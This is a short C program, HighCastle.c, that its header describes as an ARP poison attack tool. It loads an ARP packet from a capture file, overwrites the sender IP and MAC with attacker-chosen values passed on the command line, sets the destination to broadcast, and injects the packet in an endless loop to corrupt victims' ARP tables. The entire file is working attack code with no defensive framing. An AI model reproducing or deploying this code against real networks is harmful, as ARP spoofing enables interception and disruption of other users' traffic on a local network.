/**************************************************
HighCastle.c

Date: October 8, 2018

Author: Joseph Rocha <JosephRocha.CS@gmail.com>

Purpose: This program performs a ARP poison attack
         against a client.

Sample Invocation:
  ./HighCastle <Spoof_IP> <Spoof_MAC>
**************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pcap.h>
#include <dnet.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <net/ethernet.h>

typedef struct arphdr{
    u_int16_t htype;    /* Hardware Type           */
    u_int16_t ptype;    /* Protocol Type           */
    u_char hlen;        /* Hardware Address Length */
    u_char plen;        /* Protocol Address Length */
    u_int16_t oper;     /* Operation Code          */
    u_char sha[6];      /* Sender hardware address */
    u_char spa[4];      /* Sender IP address       */
    u_char tha[6];      /* Target hardware address */
    u_char tpa[4];      /* Target IP address       */
}arphdr_t;

int main(int argc, char **argv) {
    char *device; /* Name of device (e.g. eth0, wlan0) */
    char error_buffer[PCAP_ERRBUF_SIZE]; /* Size defined in pcap.h */
    pcap_t *handle;
    pcap_t *handle2;
    const u_char *packet;
    bpf_u_int32 subnet_mask, ip;
    struct pcap_pkthdr packet_header;
    struct arphdr* arp_header;
    struct addr ip_address;
    eth_addr_t ether_address;

    /* Find a device */
    device = "eno1";//pcap_lookupdev(error_buffer);
    pcap_lookupnet(device, &ip, &subnet_mask, error_buffer);

    /* Open device for live capture */
    handle = pcap_open_live(device, BUFSIZ, 1, 10000, error_buffer);

    /* Open second device to read from file and read*/
    handle2 = pcap_open_offline("arp.pcap", error_buffer);
    packet = pcap_next(handle2, &packet_header);

    arp_header = (struct arphdr*) (packet + sizeof(struct ether_header));

    // Set destination to broadcast to entire LAN
    struct ether_header* eth_header = (struct ether_header*) packet;
    eth_pton("FF:FF:FF:FF:FF:FF", &ether_address);
    memcpy(&eth_header->ether_dhost, &ether_address, ETH_ADDR_LEN);

    //Insert this record into the victim's ARP table.
    inet_pton(AF_INET, argv[1], &(ip_address.addr_ip));
    memcpy(&arp_header->spa, &ip_address.addr_ip, IP_ADDR_LEN);
    eth_pton(argv[2], &ether_address);
    memcpy(&arp_header->sha, &ether_address, ETH_ADDR_LEN);

    //Eh do I need this?
    inet_pton(AF_INET, "0.0.0.0", &(ip_address.addr_ip));
    memcpy(&arp_header->tpa, &ip_address.addr_ip, IP_ADDR_LEN);
    eth_pton("00:00:00:00:00:00", &ether_address);
    memcpy(&arp_header->tha, &ether_address, ETH_ADDR_LEN);

    //Inject!
    while(1)
        pcap_inject(handle, packet, packet_header.len);
    return 0;
}
